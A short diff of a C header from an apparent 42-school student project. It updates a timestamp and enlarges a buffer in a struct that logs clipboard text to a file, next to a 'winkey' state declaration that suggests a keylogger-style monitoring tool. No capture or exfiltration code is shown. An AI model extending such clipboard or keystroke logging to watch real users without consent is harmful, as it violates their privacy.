@@ -6,7 +6,7 @@
 /*   By: vzurera- <vzurera-@student.42malaga.com    +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/05/14 16:21:25 by vzurera-          #+#    #+#             */
-/*   Updated: 2025/05/21 16:17:19 by vzurera-         ###   ########.fr       */
+/*   Updated: 2025/08/19 17:06:55 by vzurera-         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -40,7 +40,7 @@
 	typedef struct s_clipboard_state 
 	{
 		FILE   *clipboardFile;          // clipboard log file
-		char   lastClipboardText[512];  // last clipboard text
+		char   lastClipboardText[1024 * 10];  // last clipboard text
 	}   t_ClipboardState;
 
 	extern t_WinkeyState g_winkeyState;
